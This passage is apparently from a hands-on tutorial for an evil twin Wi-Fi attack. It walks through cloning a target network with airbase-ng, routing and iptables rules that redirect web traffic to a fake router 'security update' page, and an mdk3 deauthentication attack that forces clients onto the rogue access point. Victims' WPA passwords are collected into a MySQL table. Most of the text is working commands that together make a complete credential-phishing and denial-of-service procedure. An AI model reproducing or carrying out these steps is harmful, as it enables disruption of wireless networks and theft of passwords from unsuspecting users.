    to create a database named "evil twin" so let''s input:

    ```sql

    create database evil_twin;

    ```

    and then press ENTER. Now we need to create a table with some columns which will
    represent the data that the client enters in the password field on our security
    update page. So to move into our new database, we need to input:

    ```sql

    use evil_twin

    ```

    And then press ENTER and now we''re going to input:

    ```sql

    create table wpa_keys(password varchar(64), confirm varchar(64));

    ```

    and then press enter. This command created a table called "wpa_keys" which contains
    two columns, one is called "password" and the other is called "confirm". The 64
    represents the maximum number of characters that can be stored in the column,
    and we use 64 because a WPA password can contain up to 64 characters.


    Moving on, we need to find our virtual network adapter''s interface name and our
    local IP address because we''re going to be using them in future commands. Thus
    let''s open up a new terminal and we can leave the MySQL terminal open because
    we''ll be accessing that later on. In the new terminal we need to input:

    ```

    ip addr

    ```

    and then press Enter, and go ahead and find your virtual network adapter''s interface
    name and your local IP address. My interface name is "eth0" and my local IP address
    is "192.168.0.6" but yours might be different. Open up a blank notepad to keep
    track of this information and go ahead and note these items the way I show you
    so that we can easily refer to them later on without confusion. We''ll call our
    virtual network adapter''s interface name our wired interface and mine is eth0,
    and then we''ll call our local IP address our local IP and mine is 192.168.0.6.


    ### Wired Interface: eth0

    ### Local IP Address: 192.168.0.6


    Now that we''ve made note of that information, we need to find the name of our
    USB network adapter''s interface. So go ahead and connect your USB network adapter
    if you haven''t already done so, and then let''s move back into the terminal.
    In the terminal we need to input:

    ```

    airmon-ng

    ```

    and then press ENTER and go ahead and find your USB network adapter''s interface
    name. Your interface name is showing right under the "Interface" column, and then
    let''s make note of that in your notepad. We''ll call it our wireless interface,
    and mine is wlan0:


    ### Wireless Interface: wlan0


    And now we need to create a monitor interface, so let''s move back into the terminal,
    and we need to input:

    ```

    airmon-ng start [wlan0]

    ```

    and then press enter, then go ahead and find your monitor interface name. The
    monitor interface is shown within the sentence "(monitor mode enabled on wlan0)"
    and then let''s make a note of that in your notepad. We''ll call it our monitor
    interface and mine is mon0:

    > Monitor Interface: mon0


    And now we''re going to use "airodump" to find the wireless network that we want
    to clone, but first I''m going to share with you something that will allow us
    to identify the type of router that the target network is using. Thus let''s move
    back into the terminal and input:

    ```

    airodump-ng-oui-update

    ```

    and then press ENTER. Here, give it a moment to download the "OUI" file. This
    provides us with a list of manufacturers and known MAC address formats. What this
    does is it allows "airodump" to compare the discovered networks'' BSSIDs to the
    list, and display the corresponding manufacturer for us in the scan results.


    Moving on, let''s go ahead and start our scan. To do this, we need to input:

    ```bash

    airodump-ng -M mon0

    ```

    and then press enter, and when you find the wireless network that you want to
    target, you need to press the "ctrl+C" keys to stop the scan. Now we need to make
    note of the target''s "ESSID", the channel number referenced as "CH" and the target''s
    "BSSID". Therefore, let''s move back into your notepad, and we''re going to call
    these items "Target ESSID", "Target Channel Number" and "Target BSSID" so go ahead
    and refer back to your terminal and write down these details as follows:

    - **Target ESSID:** freewifi

    - **Target Channel Number:** 6

    - **Target BSSID:** aa:bb:cc:dd:ee:ff


    Regarding the ESSID, make sure you use any uppercase or lowercase as necessary
    and then write down the channel number, where mine is 6, and then for the BSSID,
    I recommend simply copying and pasting to ensure that you don''t make any errors.
    To copy text from the Kali terminal without using right-click, you can simply
    press the "ctrl+shift+C" keys to copy any text. The same goes for if you want
    to paste text, you can press the "ctrl+shift+V" keys. Once you have pasted this
    information into the notepad, now that we have our target''s information, we can
    create an evil twin. So let''s move back into the terminal and now we need to
    input:

    ```bash

    airbase-ng -e freewifi -c 6 -P mon0

    ```

    Here, you are referencing the target''s ESSID, then the target''s channel number
    which is 6 in my case, and then enter the name of your monitor interface, where
    you can see that mine is "mon0" and then press Enter.


    Now that our evil twin access point is up and running, we need to configure our
    tunnel interface so we can create a bridge between our evil twin access point
    and our wired interface. So let''s go ahead and open up a new terminal, but don''t
    close the airbase terminal or the MySQL terminal. In the terminal we need to input:

    ```bash

    ifconfig at0 192.168.1.129 netmask 255.255.255.128

    ```

    And then press enter.


    Now we need to add a routing table and enable IP forwarding so we can forward
    traffic to and from our evil twin access point, so let''s input:

    ```bash

    route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129

    ```

    and then press enter. Now we need to input:

    ```bash

    echo 1 > /proc/sys/net/ipv4/ip_forward

    ```

    and then press enter.


    Now we need to create some iptables rules. These rules will determine how network
    traffic is handled. First we''re going to create a rule for managing traffic that
    needs to go to our wired interface which is our internet source, so let''s input:

    ```bash

    iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE

    ```

    Note that MASQUERADE should be written in all uppercase, and then press Enter.


    Now we need to create a rule for managing traffic that is going into our tunnel
    interface so let''s input:

    ```bash

    iptables --append FORWARD --in-interface at0 -j ACCEPT

    ```

    and then press Enter.


    Now we need to create a rule that allows TCP connections on port 80 and forwards
    them to our web server so we need to input:

    ```bash

    iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.0.6:80

    ```

    and then press Enter.


    For the final rule, we need to create a rule that allows us to provide a network
    address translation and to do this we need to input:

    ```bash

    iptables -t nat -A POSTROUTING -j MASQUERADE

    ```

    and then press Enter.


    Now that we have iptables set up, we need to point it to our DHCP configuration
    file and start our DHCP server, so let''s input:

    ```bash

    dhcpd -cf /etc/dhcpd.conf --pf /var/run/dhcpd.pid at0

    ```

    and then press enter. Then input:

    ```bash

    /etc/init.d/isc-dhcp-server start

    ```

    and then press enter. You should now see the following output:

    > Starting ISC DHCP server: dhcpd

    That reflects that the DHCP server is started and it started successfully.


    For the last step, we need to force the target network''s clients to connect to
    our evil twin access point. To accomplish this, we need to disconnect the clients
    from the target network by performing a deauthentication attack. Keep in mind,
    there are various ways to do this, but for this attack we''re going to use MDK3.
    First we need to create a blacklist file that contains the target''s MAC address
    or BSSID. So let''s input:

    ```bash

    echo aa:bb:cc:dd:ee:ff > blacklist

    ```

    aa:bb:cc:dd:ee:ff here references the target''s BSSID, so just go ahead and copy
    that out of your notepad and then paste it into the terminal to blacklist it as
    above and then press ENTER.


    Then to start the deauthentication attack, we need to input:

    ```bash

    mdk3 mon0 d -b blacklist -c 6

    ```

    Here, you have to enter the name of your monitor interface and mine is mon0, and
    then the target''s channel number and mine is 6, and then press enter.


    Now you can move over to the computer that you are using to simulate a victim.
    If the deauthentication attack is successful, your victim computer should lose
    the current connection any moment. Once your victim computer has lost his connection,
    what''s going to happen is that your victim computer will try to re-establish
    the connection that it just lost, however because we''ve suspended the legitimate
    network, it should connect to the evil twin network instead. If you go back over
    to the airbase terminal to watch for the connection it should show that someone
    is connected to your evil twin access point.


    So if you move back over to your victim computer, you can open a web browser and
    just try to go to google.com. Here, you should see that you have been brought
    to a security update page and as a user you want to make sure that your router
    is current on all of its updates, particularly security updates, so it will ask
    you to enter your WPA password as the router update is requesting. Once you confirm
    the password then click update.


    Now let''s move back over to your MySQL terminal and check if you were able to
    capture the WPA password.'
